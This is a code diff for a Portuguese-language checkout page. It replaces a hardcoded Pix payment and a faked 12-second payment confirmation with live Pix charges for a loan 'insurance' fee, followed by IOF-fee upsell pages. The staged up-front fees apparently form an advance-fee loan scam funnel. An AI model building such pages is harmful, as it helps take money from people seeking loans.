@@ -37,18 +37,15 @@ const calcSeguro = (valor: number) => {
   return { total, morte, desemprego, emergencia };
 };
 
-const PIX_PAYLOAD =
-  "00020101021226800014br.gov.bcb.pix2558qrcode.mkip.com.br/v1/2684c286-628c-4f2d-b1fd-20512cdb336b5204000053039865802BR5915TTKBRASILSEGURO6008SAOPAULO62070503***63044FF2";
-
 const Pagamento = () => {
   const [params] = useSearchParams();
   const navigate = useNavigate();
   const valor = Number(params.get("valor") || 5000);
+  const nome = params.get("nome") || "";
   const seguro = useMemo(() => calcSeguro(valor), [valor]);
 
   const [oferta, setOferta] = useState<"principal" | "extra1" | "extra2">("principal");
   const [showPix, setShowPix] = useState(false);
-  const [pixLoading, setPixLoading] = useState(true);
   const [copied, setCopied] = useState(false);
 
   const valorOfertaExtra1 = 7000;
@@ -61,37 +58,40 @@ const Pagamento = () => {
   const seguroAtual =
     oferta === "principal" ? seguro : oferta === "extra1" ? seguroExtra1 : seguroExtra2;
 
-  useEffect(() => {
-    if (showPix) {
-      setPixLoading(true);
-      const t = setTimeout(() => setPixLoading(false), 2200);
-      return () => clearTimeout(t);
-    }
-  }, [showPix]);
+  const { create, reset, pix, loading: pixLoading, error: pixError, status } = useParadisePix(() => {
+    navigate(`/up1?${params.toString()}`);
+  });
 
-  // Simula confirmação do pagamento e segue para o primeiro upsell (IOF)
-  useEffect(() => {
-    if (showPix && !pixLoading) {
-      const t = setTimeout(() => {
-        navigate(`/up1?${params.toString()}`);
-      }, 12000);
-      return () => clearTimeout(t);
-    }
-  }, [showPix, pixLoading, navigate, params]);
-
-  const handleCopy = async () => {
+  const openPix = async () => {
+    setShowPix(true);
     try {
-      await navigator.clipboard.writeText(PIX_PAYLOAD);
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2200);
+      await create({
+        amountCents: Math.round(seguroAtual.total * 100),
+        description: `Seguro Prestamista - Bancred (${formatBRL(valorAtual)})`,
+        stage: "seguro",
+        customer: nome ? { name: nome } : undefined,
+      });
     } catch {
-      // ignore
+      /* erro tratado pelo hook */
     }
   };
 
-  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=0&data=${encodeURIComponent(
-    PIX_PAYLOAD
-  )}`;
+  const closePix = () => {
+    setShowPix(false);
+    reset();
+    setCopied(false);
+  };
+
+  const handleCopy = async () => {
+    if (!pix?.qr_code) return;
+    try {
+      await navigator.clipboard.writeText(pix.qr_code);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2200);
+    } catch {
+      /* ignore */
+    }
+  };
 
   const OfferCard = ({
     id,
